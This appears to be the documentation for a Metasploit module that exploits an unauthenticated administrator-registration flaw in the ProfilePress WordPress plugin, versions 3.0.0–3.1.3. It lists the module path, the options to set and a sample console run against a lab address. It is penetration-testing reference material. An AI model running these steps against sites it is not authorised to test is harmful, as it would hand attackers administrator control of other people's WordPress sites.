## Description
A vulnerability in the user registration component found in the ~/src/Classes/RegistrationAuth.php file of the ProfilePress WordPress plugin made it possible for users to register on sites as an administrator. This issue affects versions 3.0.0 - 3.1.3.

## Verification Steps
Confirm that functionality works:
1. Start `msfconsole`
2. use `auxiliary/admin/http/wp_profile_press_unauthenticated_privilege_escalation`
3. Set the `RHOSTS`
4. Set `TARGETURI`
5. Set `RPORT`
6. Run the exploit: `run`

## Scenarios
```
msf5 auxiliary(admin/http/wp_profile_press_unauthenticated_privilege_escalation) > use auxiliary/admin/http/wp_profile_press_unauthenticated_privilege_escalation
msf5 auxiliary(admin/http/wp_profile_press_unauthenticated_privilege_escalation) > set RHOSTS 192.168.1.15
RHOSTS => 192.168.1.15
msf5 auxiliary(admin/http/wp_profile_press_unauthenticated_privilege_escalation) > set RPORT 80
RPORT => 80
msf5 auxiliary(admin/http/wp_profile_press_unauthenticated_privilege_escalation) > set TARGETURI wordpress/
TARGETURI => wordpress/
msf5 auxiliary(admin/http/wp_profile_press_unauthenticated_privilege_escalation) > run
```
## Test environment
Windows 10 running WordPress 5.8.1, ProfilePress WordPress plugin 3.1.3
